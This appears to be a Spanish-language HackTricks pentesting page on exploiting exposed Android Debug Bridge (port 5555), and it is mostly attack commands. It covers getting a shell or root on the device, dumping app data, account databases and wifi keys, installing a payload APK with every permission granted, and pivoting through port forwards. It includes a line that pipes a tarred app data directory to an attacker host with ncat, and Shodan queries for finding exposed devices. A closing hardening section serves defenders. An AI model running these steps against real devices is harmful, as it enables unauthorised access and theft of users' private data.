# 5555 - Android Debug Bridge

{{#include ../banners/hacktricks-training.md}}

## Información Básica

De [los docs](https://developer.android.com/studio/command-line/adb):

Android Debug Bridge (adb) es una herramienta de línea de comandos para comunicarse con dispositivos y emuladores basados en Android. Las acciones típicas incluyen instalar paquetes, depurar y obtener un shell Unix interactivo en el dispositivo.

- Puerto TCP predeterminado histórico: 5555 (modo clásico "adb tcpip").
- La depuración inalámbrica moderna (Android 11+) utiliza emparejamiento TLS y descubrimiento de servicios mDNS. El puerto de conexión es dinámico y se descubre a través de mDNS; puede que no sea 5555. El emparejamiento se realiza con adb pair host:port seguido de adb connect. Consulte las notas a continuación para implicaciones ofensivas.

Ejemplo de huella dactilar de nmap:
```
PORT     STATE SERVICE VERSION
5555/tcp open  adb     Android Debug Bridge device (name: msm8909; model: N3; device: msm8909)
```
## Conectar

Si encuentras ADB expuesto y accesible, intenta conectarte y enumerar rápidamente:
```bash
adb connect <ip>[:<port>]      # Default is 5555 for classic mode
adb devices -l                 # Confirm it shows as "device" (not unauthorized/offline)
adb shell                      # Get an interactive shell (uid usually shell)
whoami; id; getprop ro.debuggable ro.secure service.adb.tcp.port
adb root || true               # Works on eng/userdebug/insecure builds, many emulators/IoT
```
- Si el dispositivo impone autenticación ADB (ro.adb.secure=1), necesitarás estar preautorizado (autenticación USB RSA) o usar el emparejamiento de depuración inalámbrica de Android 11+ (que requiere un código único mostrado en el dispositivo).
- Algunas imágenes de proveedores, compilaciones de ingeniería/userdebug, emuladores, TVs, STBs y kits de desarrollo exponen adbd sin autenticación o con adbd ejecutándose como root. En esos casos, normalmente accederás directamente a un shell o shell root.

Para una referencia general de comandos ADB, consulta:

{{#ref}}
../mobile-pentesting/android-app-pentesting/adb-commands.md
{{#endref}}

## Rápida Post-Explotación

Una vez que tengas shell, valida privilegios y contexto SELinux:
```bash
id; getenforce; getprop ro.build.type ro.product.model ro.build.fingerprint
```
### Enumerar y capturar datos

- Lista de aplicaciones de terceros y rutas:
```bash
pm list packages -3
pm path <pkg>
```
- Si tienes root (adb root o su funcionan), puedes acceder a /data directamente. Si no, prefiere run-as para aplicaciones depurables:
```bash
# Sin root, para una aplicación depurable
run-as <pkg> sh -c 'cd /data/data/<pkg> && tar cf - .' | tar xf - -C ./loot/<pkg>

# Con root
cp -a /data/data/<pkg> /sdcard/<pkg>
exit
adb pull "/sdcard/<pkg>"
```
- Artefactos del sistema útiles (se requiere root):
- /data/system/users/0/accounts.db y datos relacionados de AccountManager
- /data/misc/wifi/ (configuraciones/keys de red en versiones anteriores)
- Bases de datos SQLite específicas de la aplicación y shared_prefs bajo /data/data/<pkg>

Puedes usar esto para recuperar información sensible (por ejemplo, secretos de la aplicación). Para notas sobre consideraciones de datos de Chrome, consulta el problema referenciado [aquí](https://github.com/carlospolop/hacktricks/issues/274).

### Ejecución de código y entrega de payload

- Instalar y otorgar permisos de ejecución automáticamente:
```bash
adb install -r -g payload.apk         # -g otorga todos los permisos de ejecución declarados en el manifiesto
adb shell monkey -p <pkg> -c android.intent.category.LAUNCHER 1
```
- Iniciar actividades/servicios/broadcasts directamente:
```bash
adb shell am start -n <pkg>/<activity>
adb shell am startservice -n <pkg>/<service>
adb shell am broadcast -a <action>
```

### Reenvío de puertos y pivoting

Incluso sin root, adb puede reenviar puertos locales a puertos del dispositivo y viceversa. Esto es útil para acceder a servicios vinculados localmente en el dispositivo o para exponer servicios del atacante al dispositivo.

- Reenviar host->dispositivo (acceder a un servicio local del dispositivo desde tu host):
```bash
adb forward tcp:2222 tcp:22       # Si el dispositivo ejecuta SSH (por ejemplo, Termux/Dropbear)
adb forward tcp:8081 tcp:8080     # Exponer el servidor de depuración local de la aplicación
```
- Inverso dispositivo->host (dejar que el dispositivo acceda a un servicio en tu host):
```bash
adb reverse tcp:1080 tcp:1080     # Las aplicaciones del dispositivo ahora pueden alcanzar host:1080 como 127.0.0.1:1080
```
- Exfiltración de archivos a través de sockets (sin escrituras en sdcard):
```bash
# En el host: escuchar
ncat -lvp 9000 > dump.tar
# En el dispositivo: enviar directorio como tar (root o run-as según corresponda)
adb shell "tar cf - /data/data/<pkg>" | ncat <HOST_IP> 9000
```

## Depuración Inalámbrica (Android 11+)

Android moderno implementa depuración inalámbrica protegida por TLS con emparejamiento del lado del dispositivo y descubrimiento mDNS:
```bash
# On the device: Developer options -> Wireless debugging -> Pair device with pairing code
# On attacker host (same L2 network, mDNS allowed):
adb pair <device_ip>:<pair_port>   # Enter the 6-digit code shown on device
adb mdns services                  # Discover _adb-tls-connect._tcp / _adb._tcp services
adb connect <device_ip>:<conn_port>
```
Notas
- Los puertos son dinámicos; no asumas 5555. Los nombres de servicio mDNS son como:
- _adb-tls-pairing._tcp (emparejamiento)
- _adb-tls-connect._tcp (conexión emparejada)
- _adb._tcp (legado/plano)
- Si mDNS está filtrado, la habilitación clásica asistida por USB puede seguir funcionando en algunas versiones: `adb tcpip 5555` luego `adb connect <ip>:5555` (hasta el reinicio).

Implicaciones ofensivas: si puedes interactuar con la interfaz de usuario del dispositivo (por ejemplo, acceso físico o mala configuración de MDM móvil) para habilitar la depuración inalámbrica y ver el código de emparejamiento, puedes establecer un canal ADB emparejado de larga duración sin un cable. Algunos OEM exponen ADB sobre TCP en imágenes de ingeniería/desarrollo sin emparejamiento—siempre verifica.

## Fortalecimiento / Detección

Los defensores deben asumir que cualquier adbd (TCP) accesible es un riesgo crítico.

- Desactiva ADB y la depuración inalámbrica cuando no sea necesario. Revoca las autorizaciones de depuración USB en las opciones de desarrollador.
- Asegúrate de que la política de red bloquee TCP/5555 entrante y el descubrimiento ADB basado en mDNS en segmentos no confiables.
- En dispositivos bajo tu control:
```bash
settings put global adb_enabled 0
setprop service.adb.tcp.port -1   # desactivar la escucha TCP (o usar: adb usb)
stop adbd; start adbd             # reiniciar el daemon
```
- Monitorea los registros mDNS `_adb._tcp`, `_adb-tls-connect._tcp`, `_adb-tls-pairing._tcp` en redes corporativas y alerta sobre oyentes inesperados en 5555.
- Inventario para versiones inseguras: `getprop ro.debuggable`, `ro.build.type`, y `ro.adb.secure`.

## Shodan

- android debug bridge
- port:5555 product:"Android Debug Bridge"

## Referencias

- Android Developers – Android Debug Bridge (adb): https://developer.android.com/studio/command-line/adb
- AOSP – ADB over Wi‑Fi, pairing and mDNS service names: https://android.googlesource.com/platform/packages/modules/adb/+/refs/tags/android-vts-15.0_r2/docs/dev/adb_wifi.md
{{#include ../banners/hacktricks-training.md}}
